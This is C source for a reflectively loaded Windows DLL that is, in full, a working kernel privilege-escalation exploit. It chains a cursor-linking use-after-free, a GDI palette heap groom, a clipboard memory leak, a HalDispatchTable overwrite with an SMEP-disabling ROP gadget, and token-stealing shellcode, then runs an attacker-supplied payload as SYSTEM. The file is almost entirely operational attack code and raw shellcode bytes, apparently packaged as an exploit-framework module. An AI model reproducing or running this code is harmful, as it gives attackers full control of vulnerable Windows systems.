#define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
#include "../../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

// Uncomment this line to enable to debug output
//#define DEBUGGING

// Purloined from ntstatus.h
#define STATUS_SUCCESS                          ((NTSTATUS)0x00000000L) // ntsubauth

#define WIN32_NO_STATUS
#include <windows.h>
#include "LinkCursorPoc.h"
#undef WIN32_NO_STATUS

#ifdef DEBUGGING
// only needed because of the output printf stuff when debugging
#include <stdio.h>
#endif

#ifndef _NTDEF_
typedef __success(return >= 0) LONG NTSTATUS;
typedef NTSTATUS *PNTSTATUS;
#endif

// payload info
typedef struct
{
	LPVOID lpPayload;
	DWORD dwOffset;
} *PINFO;

#ifdef DEBUGGING
void dprintf(char* pszFormat, ...)
{
	char s_acBuf[2048];
	va_list args;
	va_start(args, pszFormat);
	vsprintf_s(s_acBuf, sizeof(s_acBuf) - 1, pszFormat, args);
	OutputDebugString(s_acBuf);
	va_end(args);
}
#else
#define dprintf(...)
#endif

// syscall numbers

#define __NR_NtUserLinkDpiCursor 0x138e
#define __NR_NtUserDestroyCursor 0x109d
#define __NR_NtUserInjectGesture 0x1385
#define __NR_NtUserConvertMemHandle 0x10fe
#define __NR_NtCreateTimer 0x0b1
#define __NR_NtQueryIntervalProfile 0x132

/* Globals */

BYTE syscallCode[] =
	"\x4C\x8B\xD1"          // MOV R10, RCX
	"\xB8\x00\x00\x00\x00"  // MOV EAX,
	"\x0F\x05"              // SYSENTER
	"\xC3";                 // RET

BYTE adjustStackCode[] =
	"\x48\x83\xEC\x40"                          // sub rsp, 40h
	"\x49\xBA\xDE\xC0\xAD\xDE\xDE\xC0\xAD\xDE"  // mov r10, 0DEADC0DEh address of gestureInfo+38h
	"\x4C\x89\x54\x24\x20"                      // mov [rsp+20h], r10
	"\x48\xB8\xDE\xC0\xAD\xDE\xDE\xC0\xAD\xDE"  // mov qword ptr rax, deadc0deh
	"\xFF\xD0"                                  // call rax
	"\x48\x83\xC4\x40"                          // add rsp, 40h
	"\xC3";                                     // ret

// This slightly modified shellcode is taken from Sebastian Apelt's Pwn2Own Afd.sys 
// privilege escalation write up, credit to him

BYTE privEscCode[] =
	"\x41\x51"                                  // push r9 save regs
	"\x41\x52"                                  // push r10
	"\x65\x4C\x8B\x0C\x25\x88\x01\x00\x00"      // mov r9, gs:[0x188], get _ETHREAD from KPCR (PRCB @ 0x180 from KPCR, _ETHREAD @ 0x8 from PRCB)
	"\x4D\x8B\x89\xB8\x00\x00\x00"              // mov r9, [r9+0xb8], get _EPROCESS from _ETHREAD
	"\x4D\x89\xCA"                              // mov r10, r9 save current eprocess
	"\x4D\x8B\x89\x40\x02\x00\x00"              // mov r9, [r9+0x240] $a, get blink
	"\x49\x81\xE9\x38\x02\x00\x00"              // sub r9, 0x238 => _KPROCESS
	"\x49\x83\xB9\xE0\x02\x00\x00\x04"          // cmp [r9+0x2e0], 4 is UniqueProcessId == 4?
	"\x75\xe8"                                  // jnz $a no? then keep searching!
	"\x4D\x8B\x89\x48\x03\x00\x00"              // mov r9, [r9+0x348] get token
	"\x4D\x89\x8A\x48\x03\x00\x00"              // mov [r10+0x348], r9 replace our token with system token
	"\x49\xB9\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA"  // mov r9, 0Ah  dynamic object address of freed palette
	"\x49\xBA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA"  // mov r10, 0Ah dynamic object handle of freed palette
	"\x4D\x89\x11"                              // mov [r9], r10 replace the wrong handle with the original object handle
	"\x41\x83\x61\x08\x00"                      // and dword ptr [r9+8], 0 zero out the objects reference count
	"\x41\x5A"                                  // pop r10 restore regs
	"\x41\x59"                                  // pop r9
	"\x48\x8B\x44\x24\x20"                      // mov rax, [rsp+0x20] repair stack
	"\x48\x83\xC0\x3F"                          // add rax, 0x3f
	"\x48\x83\xEC\x30"                          // sub rsp, 0x30
	"\x48\x89\x04\x24"                          // mov [rsp], rax
	"\xc3";                                     // ret resume

PBYTE syscallCodePtr = syscallCode;
PBYTE gestureCodePtr = adjustStackCode;

PLOGPALETTE pLogPal420;
HPALETTE palArray[32];
HPALETTE fillerPalettes[32];

// Needed for window creation
LRESULT CALLBACK gesture_proc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

// Used for system calls ( http://j00ru.vexillium.org/ )
ULONG call_service(DWORD dwServiceId, ULONG_PTR arg1, ULONG_PTR arg2, ULONG_PTR arg3,
	ULONG_PTR arg4, ULONG_PTR arg5, ULONG_PTR arg6, ULONG_PTR arg7,
	ULONG_PTR arg8)
{
	memcpy(&syscallCode[4], &dwServiceId, sizeof(DWORD));

	return SystemCall(arg1, arg2, arg3, arg4,
		arg5, arg6, arg7, arg8);
}

/* 
    Because GDI allocations don't get immediately freed, we need to allocate at least 32 objects
    of the same size in order to trigger a call to nt!ExDeferredFreePool which allows us to 
    replace the desired object
*/
void flush_deferred_pool()
{
	ULONG i;

	for (i = 0; i < 32; i++)
	{
		fillerPalettes[i] = CreatePalette(pLogPal420);
	}

	for (i = 0; i < 32; i++)
	{
		DeleteObject(fillerPalettes[i]);
	}
}

// Wrapper around call_service which adjusts the stack and is used to replace the freed Cursor
ULONG inject_gesture(HWND hwnd, PEXTGESTUREINFO pGestureInfo)
{
	ULONG_PTR pAddr = (ULONG_PTR)SystemCall;
	ULONG i = 0;
	DWORD dwServiceId = __NR_NtUserInjectGesture;
	ULONG_PTR extra = (ULONG_PTR)(pGestureInfo + 1);
	DWORD dwOldProtect;

	memcpy(&adjustStackCode[6], &extra, sizeof(ULONG_PTR));
	memcpy(&adjustStackCode[21], &pAddr, sizeof(ULONG_PTR));
	memcpy(&syscallCode[4], &dwServiceId, sizeof(DWORD));

	VirtualProtect(adjustStackCode, sizeof(adjustStackCode), PAGE_EXECUTE_READWRITE, &dwOldProtect);

	memcpy(&NtInjectGesture, &gestureCodePtr, sizeof(PVOID));

	for (i = 0; i < 5; i++)
	{
		NtInjectGesture(SYSCALL_ARG(hwnd), 0, 0, SYSCALL_ARG(pGestureInfo), 0, 0, 0, 0);
	}
	return 0;
}

ULONG_PTR info_leak()
{
	const ULONG deterministic = 3;
	const ULONG uMaxTries = 200;

	LOGPALETTE logpal;
	ULONG_PTR pLastPalette = 0;
	ULONG_PTR pTargetPalette = 0;

	ULONG i = 0;
	ULONG uPalAllocs = 0;
	ULONG uContiguousAllocs = 0;
	ULONG uTryCount = 0;

	HANDLE hHeap = GetProcessHeap();

	LPVOID* ppvBits = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x10);

	pLogPal420 = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x8900);

	//pLogPal420->palNumEntries = 0xe5;
	pLogPal420->palVersion = 0x0300;
	pLogPal420->palNumEntries = 0x2300;

	logpal.palNumEntries = 1;
	logpal.palVersion = 0x0300;

	HPALETTE hTempPal = CreatePalette(pLogPal420);
	DeleteObject(hTempPal);

	// A basic palette object is 0x98 + 4 * numEntries bytes in size, so in order to fit into
	// the leaking dib which is 0x42c bytes big, we need 0xe5 entries ( 0x98 + 4 * 0xe5 = 0x42c)
	pLogPal420->palNumEntries = 0xe5;

	do
	{
		HPALETTE hPal = CreatePalette(&logpal);
		HBITMAP hClipBm = CreateCompatibleBitmap(NULL, 1, 1);

		// Create the "special" bitmap
		HBITMAP hBm = CreateBitmap(1, 1, 1, 5, ppvBits);

		if (!OpenClipboard(NULL))
		{
			return 0;
		}

		EmptyClipboard();

		SetClipboardData(CF_BITMAP, (HANDLE)hClipBm);

		// Place the dummy DIB on the clipboard by closing it
		CloseClipboard();

		if (!OpenClipboard(NULL))
		{
			return 0;
		}

		SetClipboardData(CF_BITMAP, hBm);

		SetClipboardData(CF_DIBV5, NULL);

		SetClipboardData(CF_PALETTE, hPal);

		flush_deferred_pool();

		// Convert the bitmap to DIB and leak the uninitialized data
		PULONG_PTR pLeakingDib = (PULONG_PTR)GetClipboardData(CF_DIB);

		flush_deferred_pool();

		// One of these palettes will later be freed
		for (i = 0; i < 32; i++)
		{
			palArray[i] = CreatePalette(pLogPal420);
		}

		ULONG_PTR palEntriesPtr = *(pLeakingDib + 16); // palEntries pointer @0x80
		ULONG_PTR currentPalette = *(pLeakingDib + 17); // this pointer @0x88

		palEntriesPtr -= 0x90;

		/*
			We can make sure that we have leaked a palette object by substracting 0x90 from
			the palEntries pointer which then has to be equal to the this pointer
		*/
		if (palEntriesPtr == currentPalette)
		{
			uPalAllocs++;

			if (pLastPalette != 0)
			{
				if (pLastPalette == currentPalette)
				{
					uContiguousAllocs++;

					/*
						If the same palette gets leaked 4 times in a row, the state is deterministic
						and we can be certain that at the leaked address there will be a palette
						object allocated
					*/
					if (uContiguousAllocs == deterministic)
					{
						pTargetPalette = currentPalette;
						break;
					}
				}
				else
				{
					pLastPalette = currentPalette;
					uContiguousAllocs = 0;
				}

				/*
					After 100 tries, check additionally if two or more palettes were allocated
					this is manly to speed up the leaking process (even though the speed is not a
					problem), because the allocations are not always that deterministic. This version
					is a bit less "secure" but it still works reliably.
					*/
				if (uTryCount >= 100 && uPalAllocs >= 2)
				{
					pTargetPalette = currentPalette;
					break;
				}
			}
			else
			{
				pLastPalette = currentPalette;
				uContiguousAllocs = 0;
			}
		}
		else
		{
			pLastPalette = 0;
			uContiguousAllocs = 0;
			uPalAllocs = 0;
		}

		for (i = 0; i < 32; i++)
		{
			DeleteObject(palArray[i]);
		}

		CloseClipboard();
		uTryCount++;

	} while (uTryCount < uMaxTries);

	if (pTargetPalette != 0)
	{
		dprintf("[*] Tries needed: %d", uTryCount);
	}

	return pTargetPalette;
}

DWORD WINAPI execute_payload(LPVOID lpPayload)
{
	VOID(*lpCode)() = (VOID(*)())lpPayload;
	lpCode();
	return ERROR_SUCCESS;
}

void link_and_destroy(LPVOID info)
{
	HANDLE hHeap = NULL;
	HPALETTE hFreedPalette = NULL;
	HINSTANCE hExe = NULL;
	HCURSOR hCursorA = NULL;
	HCURSOR hCursorB = NULL;
	HANDLE timer = NULL;
	ULONG hMem = 0;

	WNDCLASSEX wcx;

	ULONG_PTR rop_gadget = 0;


	ULONG i = 0;
	UINT c = 0;
	UINT found = 0;

	HMODULE hKernel = 0;
	ULONG_PTR pHalDispatchTable = 0;
	ULONG_PTR pDTableQueryInterval = 0;
	DWORD dwOldProtect;

	ULONG_PTR pTargetPalette = 0;

	RTL_PROCESS_MODULES moduleInfo;

	BYTE andMask[] = { 0xFF, 0xFF, 0xFF, 0xFF };
	BYTE xorMask[] = { 0xFF, 0xFF, 0xFF, 0xFF };

	// info contains the payload address and the dwOffset
	PINFO pInfo = (PINFO)info;

	dprintf("[*] payload resides @ %llx", pInfo->lpPayload);
	dprintf("[*] using dwOffset: %lx", pInfo->dwOffset);

	hHeap = GetProcessHeap();

	LPPALETTEENTRY palEntries = (LPPALETTEENTRY)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20);

	PFAKEPALETTE fakepalette = (PFAKEPALETTE)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x42c);

	// Set the flags that we can delete the freed palette later on (cleanup)
	fakepalette->flags = 0x501;
	// By setting numEntries to 0xe6 we can later distinguish between the normal palettes 
	// and our fakepalette
	fakepalette->numEntries = 0xe6;

	PBYTE pShellcode = (BYTE *)VirtualAlloc((LPVOID)0x00000000dead0000, // max one DWORD long
		0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	xxxNtQuerySystemInformation xxNtQuerySystemInformation = (xxxNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

	xxNtQuerySystemInformation(SystemModuleInformation, &moduleInfo, sizeof(moduleInfo), NULL);

	// Get HalDispatchTable
	hKernel = LoadLibraryA(moduleInfo.Modules[0].FullPathName + moduleInfo.Modules[0].OffsetToFileName);
	pHalDispatchTable = (ULONG_PTR)GetProcAddress(hKernel, "HalDispatchTable");
	pHalDispatchTable = pHalDispatchTable - (ULONG_PTR)hKernel + (ULONG_PTR)moduleInfo.Modules[0].ImageBase;
	pDTableQueryInterval = pHalDispatchTable + 8;

	dprintf("[*] HalDispatchTable+8 @%llx", pDTableQueryInterval);

	// Create Cursors
	hCursorA = CreateCursor(NULL, 1, 1, 4, 4, andMask, xorMask);

	hCursorB = CreateCursor(NULL, 1, 1, 4, 4, andMask, xorMask);

	dprintf("[*] Leaking address...");

	pTargetPalette = info_leak();

	if (!pTargetPalette)
	{
		dprintf("[!] Exploit failed: couldn't leak palette, try it again");
		return;
	}

	dprintf("[*] Palette was created @%llx", pTargetPalette);

	VirtualProtect(syscallCode, sizeof(syscallCode), PAGE_EXECUTE_READWRITE, &dwOldProtect);

	memcpy(&SystemCall, &syscallCodePtr, sizeof(PVOID));

	dprintf("[*] Linking cursors...");

	// Link the cursors
	BOOL bLinked = call_service(__NR_NtUserLinkDpiCursor, SYSCALL_ARG(hCursorA), SYSCALL_ARG(hCursorB),
		SYSCALL_ARG(0x30), 0, 0, 0, 0, 0);

	if (!bLinked)
	{
		dprintf("[!] Exploit failed: couldn't link cursors");
		return;
	}

	dprintf("[*] Success");
	hExe = GetModuleHandle(NULL);

	// Register the main window class. 
	wcx.cbSize = sizeof(wcx);
	wcx.style = CS_HREDRAW | CS_VREDRAW;
	wcx.lpfnWndProc = (WNDPROC)gesture_proc;
	wcx.cbClsExtra = 0;
	wcx.cbWndExtra = 0;
	wcx.hInstance = hExe;
	wcx.hIcon = NULL;
	wcx.hCursor = NULL;
	wcx.hbrBackground = NULL;
	wcx.lpszMenuName = "MainMenu";
	wcx.lpszClassName = "MainWClass";
	wcx.hIconSm = NULL;

	if (!RegisterClassEx(&wcx))
	{
		dprintf("[!] Exploit failed: couldn't register window class");
		return;
	}

	HWND hWnd = CreateWindow("MainWClass", "Sample", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT,
		CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, (HWND)NULL, (HMENU)NULL, hExe, (LPVOID)NULL);

	PEXTGESTUREINFO pGestureInfo = (PEXTGESTUREINFO)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x90);

	pGestureInfo->cbSize = sizeof(GESTUREINFO);
	pGestureInfo->cbExtraArgs = 0x40;
	pGestureInfo->hwndTarget = hWnd;
	pGestureInfo->dwFlags = 1;
	pGestureInfo->dwID = 0;
	pGestureInfo->ptsLocation.x = 0x0001;
	pGestureInfo->ptsLocation.y = 0x0002;
	pGestureInfo->dwInstanceID = 0xdeadbeef;
	pGestureInfo->arbitraryFree = pTargetPalette;
	pGestureInfo->ulArguments = 1;

	fakepalette->SelfRefPtrLow = (DWORD)pTargetPalette;
	fakepalette->SelfRefPtrHigh = (DWORD)(pTargetPalette >> 32);
	// This is were we will write and read
	fakepalette->PalEntriesPtrLow = (DWORD)pDTableQueryInterval;
	fakepalette->PalEntriesPtrHigh = (DWORD)(pDTableQueryInterval >> 32);

	// No logs between this part, its time critical apparently
	dprintf("[*] Freeing palette...");

	// Destroy and free Cursor B
	call_service(__NR_NtUserDestroyCursor, SYSCALL_ARG(hCursorB), SYSCALL_ARG(0x0),
		0, 0, 0, 0, 0, 0);

	// Replace the freed Cursor with our gestureInfo
	inject_gesture(hWnd, pGestureInfo);

	// Destroy Cursor A and free the target palette
	call_service(__NR_NtUserDestroyCursor, SYSCALL_ARG(hCursorA), SYSCALL_ARG(0x0),
		0, 0, 0, 0, 0, 0);

	flush_deferred_pool();

	// Replace the freed palette with our fakepalette
	for (i = 0; i < 32; i++)
	{
		hMem = call_service(__NR_NtUserConvertMemHandle, SYSCALL_ARG(fakepalette),
			SYSCALL_ARG(0x418), 0, 0, 0, 0, 0, 0);
	}

	dprintf("[*] Replacing palette with fakepalette");

	// Search in the previously allocated palettes for one that has it's numberEntries member
	// set to 0xe6 (like in our fakepalette)
	PALETTEENTRY palEntry;

	for (i = 0; i < 32; i++)
	{
		found = GetPaletteEntries(palArray[i], 0xe5, 1, &palEntry);

		// If we find one we have successfully replaced our target palette
		if (found)
		{
			dprintf("[*] Freed palette was successfully replaced");
			hFreedPalette = palArray[i];
			break;
		}
	}

	if (hFreedPalette != NULL)
	{
		// Leak the function address of nt!ArbAddReserved @ HalDispatchTable+18h to bypass ASLR
		GetPaletteEntries(hFreedPalette, 4, 2, palEntries);

		ULONG_PTR ntArbAddReserved = *((PULONG_PTR)palEntries);

		dprintf("[*] nt!ArbAddReserved@%llx", ntArbAddReserved);

		GetPaletteEntries(hFreedPalette, 0, 2, palEntries);

		ULONG_PTR haliQuerySystemInformation = *((PULONG_PTR)palEntries);

		// Calculate the address of nt!KiConfigureDynamicProcessor+0x40 which will serve as our
		// rop gadget to disable SMEP
		// this offset varies between versions
		rop_gadget = ntArbAddReserved - pInfo->dwOffset;

		/*
			mov cr4, rax
			add rsp, 28h
			ret
		*/
		dprintf("[*] rop gadget@%llx", rop_gadget);
		palEntries = (LPPALETTEENTRY)&rop_gadget;

		// Overwrite the NtQueryIntervalProfile pointer @ HalDispatchTable+8 with our rop gadget
		SetPaletteEntries(hFreedPalette, 0, 2, palEntries);

		// Write the palette object address and it's handle to the shellcode
		memcpy(&privEscCode[63], &pTargetPalette, sizeof(ULONG_PTR));
		memcpy(&privEscCode[73], &hFreedPalette, sizeof(ULONG_PTR));

		memcpy(pShellcode, privEscCode, sizeof(privEscCode));

		// Clean the stack with zeros
		call_service(__NR_NtCreateTimer, SYSCALL_ARG(&timer), SYSCALL_ARG(0x1f0003),
			SYSCALL_ARG(0x0), SYSCALL_ARG(0x0), 0, 0, 0, 0);

		dprintf("[*] executing shellcode!");

		// Disable SMEP and execute shellcode !
		DWORD dwNewRc4 = 0x000406f8;
		call_service(__NR_NtQueryIntervalProfile, SYSCALL_ARG(pShellcode), SYSCALL_ARG(&dwNewRc4),
			0, 0, 0, 0, 0, 0);

		palEntries = (LPPALETTEENTRY)&haliQuerySystemInformation;

		// Restore the NtQueryIntervalProfile pointer
		SetPaletteEntries(hFreedPalette, 0, 2, palEntries);

		// Delete the freed palette
		DeleteObject(hFreedPalette);

		// Delete the remaining palette handles
		for (i = 0; i < 32; i++)
		{
			DeleteObject(palArray[i]);
		}

		// If everything worked process should be privileged at this point
		dprintf("[!] Executing payload...");
		CreateThread(0, 0, execute_payload, pInfo->lpPayload, 0, NULL);
	}
	else
	{
		dprintf("[!] Exploit failed: Could not find freed palette.");
	}
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		hAppInstance = hinstDLL;
		if (lpReserved != NULL)
		{
			*(HMODULE *)lpReserved = hAppInstance;
		}
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		link_and_destroy(lpReserved);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}